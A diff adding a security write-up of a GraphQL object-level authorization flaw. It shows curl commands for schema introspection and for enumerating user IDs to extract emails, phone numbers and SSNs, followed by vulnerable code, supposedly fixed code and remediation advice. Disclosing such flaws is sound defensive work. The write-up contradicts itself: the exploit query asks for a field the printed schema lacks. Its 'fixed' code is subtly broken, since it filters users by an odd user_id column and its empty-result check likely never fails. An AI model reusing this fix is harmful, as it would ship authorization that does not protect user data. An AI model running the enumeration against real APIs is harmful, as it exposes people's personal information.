@@ -1,0 +1,126 @@
+---
+title: "BOLA in GraphQL API Leads to PII Exposure"
+description: "Broken Object-Level Authorization (BOLA) vulnerability in GraphQL query endpoint exposing sensitive user data."
+pubDate: 2025-03-01
+platform: Custom
+tags: [api-security, graphql, authorization, idor, pii]
+---
+
+import Callout from '../../components/Callout.astro';
+
+## Overview
+
+During a security assessment, a **Broken Object-Level Authorization (BOLA)** vulnerability was discovered in a GraphQL API endpoint. The vulnerability allowed unauthenticated attackers to enumerate user IDs and retrieve PII.
+
+**CVSS v3.1 Score: 7.5 (High)**  
+**CWE-639:** Authorization Bypass Through User-Controlled Key
+
+---
+
+## Attack Surface Discovery
+
+### GraphQL Endpoint
+
+```bash
+# GraphQL introspection query
+curl -X POST http://target.com/api/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name } } }"}'
+```
+
+The schema exposed:
+
+```graphql
+type User {
+  id: ID!
+  username: String
+  email: String
+  phone: String
+  ssn: String
+}
+
+type Query {
+  getUser(id: ID!): User
+}
+```
+
+<Callout type="info" title="Key Finding">
+The `getUser(id: ID!)` query accepts any user ID without authorization checks.
+</Callout>
+
+---
+
+## Exploitation
+
+### Enumerate User IDs
+
+```bash
+for i in {1..100}; do
+  curl -X POST http://target.com/api/graphql \
+    -H "Content-Type: application/json" \
+    -d "{\"query\":\"{ getUser(id: \\\"$i\\\") { id username } }\"}"
+done
+```
+
+### Extract PII
+
+```graphql
+query {
+  getUser(id: "1") {
+    id
+    username
+    email
+    phone
+    ssn
+    creditCardLast4
+  }
+}
+```
+
+<Callout type="danger" title="Critical Data Exposure">
+Response contains unencrypted PII including SSN and credit card data.
+</Callout>
+
+---
+
+## Root Cause
+
+### Vulnerable Code
+
+```javascript
+// ❌ No authorization check
+const getUser = async (id) => {
+  return db.query('SELECT * FROM users WHERE id = ?', [id]);
+};
+```
+
+### Fixed Code
+
+```javascript
+// ✅ Authorization check added
+const getUser = async (id, currentUser) => {
+  const user = await db.query(
+    'SELECT * FROM users WHERE id = ? AND user_id = ?',
+    [id, currentUser.id]
+  );
+  if (!user) throw new Error('Unauthorized');
+  return user;
+};
+```
+
+---
+
+## Remediation
+
+1. Implement authorization middleware
+2. Remove sensitive fields from schema
+3. Add rate limiting
+4. Use GraphQL authorization library (graphql-shield)
+
+---
+
+## References
+
+- [OWASP: Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
+- [CWE-639: Authorization Bypass](https://cwe.mitre.org/data/definitions/639.html)
+- [GraphQL Security Best Practices](https://graphql.org/learn/best-practices/#security)
